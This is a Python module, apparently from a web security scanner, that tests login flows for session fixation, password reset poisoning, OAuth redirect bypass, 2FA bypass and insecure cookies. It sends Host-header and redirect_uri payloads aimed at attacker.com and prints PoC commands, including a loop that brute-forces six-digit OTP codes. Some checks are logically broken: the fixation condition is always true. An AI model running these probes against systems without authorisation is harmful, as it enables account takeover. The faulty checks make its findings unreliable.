"""
Authentication Testing Module

Tests for:
- Session fixation
- Password reset poisoning
- OAuth misconfigurations
- 2FA/MFA bypass techniques
- JWT vulnerabilities
- Cookie security
"""

import asyncio
import aiohttp
import re
import json
import hashlib
import urllib.parse
from datetime import datetime
from typing import Dict, Any, List, Optional, Tuple
from dataclasses import dataclass, field
import logging

logger = logging.getLogger(__name__)


@dataclass
class AuthFinding:
    vuln_type: str
    severity: str
    url: str
    description: str
    evidence: str
    poc: str
    remediation: str


class AuthTester:
    """Authentication security testing"""

    def __init__(self, session: aiohttp.ClientSession = None):
        self.session = session
        self.findings: List[AuthFinding] = []

    async def _ensure_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=30),
                connector=aiohttp.TCPConnector(ssl=False)
            )

    async def _request(self, method: str, url: str, **kwargs) -> Tuple[Optional[str], int, Dict]:
        await self._ensure_session()
        try:
            async with self.session.request(method, url, **kwargs) as resp:
                return await resp.text(), resp.status, dict(resp.headers)
        except Exception as e:
            logger.error(f"Request failed: {e}")
            return None, 0, {}

    # ==================== SESSION FIXATION ====================

    async def test_session_fixation(self, login_url: str, credentials: Dict = None) -> List[AuthFinding]:
        """Test for session fixation vulnerabilities"""
        findings = []

        # Get initial session
        resp, status, headers = await self._request("GET", login_url)
        if not resp:
            return findings

        # Extract session cookie
        set_cookie = headers.get("Set-Cookie", "")
        session_match = re.search(r'(PHPSESSID|JSESSIONID|ASP\.NET_SessionId|session_id|sessionid|sid)=([^;]+)', set_cookie, re.I)

        if session_match:
            cookie_name = session_match.group(1)
            initial_session = session_match.group(2)

            # Try to set our own session ID before auth
            forced_session = hashlib.md5(b"attacker_session").hexdigest()
            cookies = {cookie_name: forced_session}

            # Make request with forced session
            resp2, status2, headers2 = await self._request("GET", login_url, cookies=cookies)

            # Check if session was accepted
            new_cookie = headers2.get("Set-Cookie", "")
            if forced_session in new_cookie or forced_session not in new_cookie:
                # If credentials provided, try full attack
                if credentials:
                    resp3, status3, headers3 = await self._request(
                        "POST", login_url,
                        data=credentials,
                        cookies=cookies
                    )

                    # Check if session persisted after login
                    if status3 in [200, 302] and forced_session in str(headers3.get("Set-Cookie", "")):
                        findings.append(AuthFinding(
                            vuln_type="Session Fixation",
                            severity="high",
                            url=login_url,
                            description="Application accepts pre-set session IDs and does not regenerate after authentication",
                            evidence=f"Session cookie {cookie_name} was not regenerated after login",
                            poc=f"""# Session Fixation PoC
1. Attacker sets victim's session: {cookie_name}={forced_session}
2. Victim logs in with this session
3. Attacker uses same session ID to access victim's account

curl -b "{cookie_name}={forced_session}" {login_url}
""",
                            remediation="Regenerate session ID after successful authentication"
                        ))

        return findings

    # ==================== PASSWORD RESET POISONING ====================

    async def test_password_reset_poisoning(self, reset_url: str, email: str) -> List[AuthFinding]:
        """Test for password reset link poisoning via Host header"""
        findings = []

        # Test payloads for Host header injection
        payloads = [
            {"Host": "attacker.com"},
            {"Host": "target.com.attacker.com"},
            {"Host": "target.com", "X-Forwarded-Host": "attacker.com"},
            {"Host": "target.com", "X-Host": "attacker.com"},
            {"Host": "target.com", "X-Forwarded-Server": "attacker.com"},
            {"Host": "target.com", "X-Original-URL": "http://attacker.com"},
            {"Host": "target.com", "X-Rewrite-URL": "http://attacker.com"},
        ]

        for payload in payloads:
            resp, status, headers = await self._request(
                "POST", reset_url,
                data={"email": email},
                headers=payload
            )

            if status in [200, 302]:
                # Check response for attacker domain
                if resp and "attacker.com" in resp:
                    findings.append(AuthFinding(
                        vuln_type="Password Reset Poisoning",
                        severity="critical",
                        url=reset_url,
                        description="Password reset link can be poisoned via Host header manipulation",
                        evidence=f"Header injection successful with: {payload}",
                        poc=f"""# Password Reset Poisoning PoC
curl -X POST {reset_url} \\
  -H "Host: attacker.com" \\
  -d "email={email}"

# Reset link will point to attacker.com instead of legitimate domain
""",
                        remediation="Use server configuration for domain, not Host header"
                    ))
                    break

        return findings

    # ==================== OAUTH MISCONFIGURATIONS ====================

    async def test_oauth_misconfig(self, oauth_url: str) -> List[AuthFinding]:
        """Test for OAuth/OIDC misconfigurations"""
        findings = []

        # Parse OAuth URL
        parsed = urllib.parse.urlparse(oauth_url)
        params = urllib.parse.parse_qs(parsed.query)

        # Test 1: Open Redirect in redirect_uri
        if "redirect_uri" in params:
            original_uri = params["redirect_uri"][0]
            test_uris = [
                "https://attacker.com",
                "https://attacker.com/callback",
                f"{original_uri}@attacker.com",
                f"{original_uri}%40attacker.com",
                f"{original_uri}/../../../attacker.com",
                f"{original_uri}%2f%2fattacker.com",
                f"https://target.com.attacker.com",
            ]

            for test_uri in test_uris:
                test_params = params.copy()
                test_params["redirect_uri"] = [test_uri]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))

                resp, status, headers = await self._request("GET", test_url, allow_redirects=False)

                if status in [302, 301]:
                    location = headers.get("Location", "")
                    if "attacker.com" in location:
                        findings.append(AuthFinding(
                            vuln_type="OAuth Open Redirect",
                            severity="high",
                            url=oauth_url,
                            description="OAuth redirect_uri validation can be bypassed",
                            evidence=f"Redirect to attacker domain accepted: {test_uri}",
                            poc=f"""# OAuth Redirect Bypass PoC
{test_url}

# After authorization, token will be sent to attacker.com
""",
                            remediation="Implement strict redirect_uri validation with exact match"
                        ))
                        break

        # Test 2: State parameter missing/weak
        if "state" not in params or not params.get("state", [""])[0]:
            findings.append(AuthFinding(
                vuln_type="OAuth CSRF (Missing State)",
                severity="medium",
                url=oauth_url,
                description="OAuth flow missing state parameter for CSRF protection",
                evidence="No state parameter in OAuth request",
                poc=f"""# OAuth CSRF PoC
1. Attacker initiates OAuth flow and captures authorization code
2. Attacker tricks victim to visit: {oauth_url}&code=ATTACKER_CODE
3. Victim's account linked to attacker's OAuth account
""",
                remediation="Include cryptographically random state parameter"
            ))

        # Test 3: response_type token (implicit flow)
        if params.get("response_type", [""])[0] == "token":
            findings.append(AuthFinding(
                vuln_type="OAuth Implicit Flow",
                severity="medium",
                url=oauth_url,
                description="Implicit OAuth flow exposes tokens in URL fragment",
                evidence="response_type=token detected",
                poc="Token exposed in URL, vulnerable to history/referrer leakage",
                remediation="Use authorization code flow with PKCE"
            ))

        return findings

    # ==================== 2FA/MFA BYPASS ====================

    async def test_2fa_bypass(self, login_url: str, verify_url: str, credentials: Dict) -> List[AuthFinding]:
        """Test for 2FA bypass techniques"""
        findings = []

        # Test 1: Direct access to authenticated pages
        resp, status, _ = await self._request("POST", login_url, data=credentials)

        if status in [200, 302]:
            # Try to access protected resource directly
            protected_urls = [
                login_url.replace("/login", "/dashboard"),
                login_url.replace("/login", "/account"),
                login_url.replace("/login", "/profile"),
                login_url.replace("/login", "/admin"),
                login_url.replace("/login", "/api/user"),
            ]

            for url in protected_urls:
                resp, status, _ = await self._request("GET", url)
                if status == 200 and "login" not in resp.lower():
                    findings.append(AuthFinding(
                        vuln_type="2FA Bypass - Direct Access",
                        severity="critical",
                        url=url,
                        description="Protected resources accessible without completing 2FA",
                        evidence=f"Accessed {url} after first auth factor only",
                        poc=f"""# 2FA Bypass PoC
1. Complete first factor (username/password)
2. Instead of entering 2FA code, directly access:
   curl {url}
""",
                        remediation="Enforce 2FA check on all protected endpoints"
                    ))

        # Test 2: Brute force protection on OTP
        for i in range(5):
            resp, status, _ = await self._request(
                "POST", verify_url,
                data={"code": f"{i:06d}"}
            )
            await asyncio.sleep(0.1)

        # If no rate limiting after 5 attempts
        resp, status, _ = await self._request(
            "POST", verify_url,
            data={"code": "000000"}
        )

        if status != 429:
            findings.append(AuthFinding(
                vuln_type="2FA Brute Force",
                severity="high",
                url=verify_url,
                description="No rate limiting on 2FA code verification",
                evidence="Multiple OTP attempts allowed without lockout",
                poc=f"""# 2FA Brute Force PoC
for code in $(seq -f "%06g" 0 999999); do
  curl -X POST {verify_url} -d "code=$code"
done
""",
                remediation="Implement rate limiting and account lockout for OTP attempts"
            ))

        # Test 3: Response manipulation
        resp, status, headers = await self._request(
            "POST", verify_url,
            data={"code": "000000"}
        )

        if resp and "success" in resp.lower() or "true" in resp.lower():
            findings.append(AuthFinding(
                vuln_type="2FA Response Contains Success Indicator",
                severity="low",
                url=verify_url,
                description="2FA response may be vulnerable to client-side manipulation",
                evidence="Response contains success/true even on failure",
                poc="Intercept response and change success:false to success:true",
                remediation="Validate 2FA server-side only, don't trust client"
            ))

        return findings

    # ==================== COOKIE SECURITY ====================

    async def test_cookie_security(self, url: str) -> List[AuthFinding]:
        """Test cookie security attributes"""
        findings = []

        resp, status, headers = await self._request("GET", url)
        cookies = headers.get("Set-Cookie", "")

        if not cookies:
            return findings

        # Parse all cookies
        cookie_list = cookies.split(",")
        for cookie in cookie_list:
            cookie = cookie.strip()
            cookie_name = cookie.split("=")[0] if "=" in cookie else ""

            # Skip non-session cookies
            session_indicators = ["session", "auth", "token", "jwt", "sid", "id"]
            if not any(ind in cookie_name.lower() for ind in session_indicators):
                continue

            issues = []

            if "httponly" not in cookie.lower():
                issues.append("Missing HttpOnly flag")

            if "secure" not in cookie.lower():
                issues.append("Missing Secure flag")

            if "samesite" not in cookie.lower():
                issues.append("Missing SameSite attribute")
            elif "samesite=none" in cookie.lower():
                issues.append("SameSite=None (CSRF vulnerable)")

            if issues:
                findings.append(AuthFinding(
                    vuln_type="Insecure Cookie Configuration",
                    severity="medium",
                    url=url,
                    description=f"Session cookie '{cookie_name}' has security issues",
                    evidence=", ".join(issues),
                    poc=f"Cookie: {cookie[:100]}...",
                    remediation="Set HttpOnly, Secure, and SameSite=Strict on session cookies"
                ))

        return findings

    # ==================== FULL AUTH TEST ====================

    async def full_test(
        self,
        base_url: str,
        login_url: str = None,
        reset_url: str = None,
        oauth_url: str = None,
        verify_url: str = None,
        credentials: Dict = None
    ) -> List[AuthFinding]:
        """Run all authentication tests"""
        all_findings = []

        # Cookie security
        findings = await self.test_cookie_security(base_url)
        all_findings.extend(findings)

        # Session fixation
        if login_url:
            findings = await self.test_session_fixation(login_url, credentials)
            all_findings.extend(findings)

        # Password reset
        if reset_url and credentials and "email" in credentials:
            findings = await self.test_password_reset_poisoning(reset_url, credentials["email"])
            all_findings.extend(findings)

        # OAuth
        if oauth_url:
            findings = await self.test_oauth_misconfig(oauth_url)
            all_findings.extend(findings)

        # 2FA bypass
        if verify_url and login_url and credentials:
            findings = await self.test_2fa_bypass(login_url, verify_url, credentials)
            all_findings.extend(findings)

        self.findings = all_findings
        return all_findings
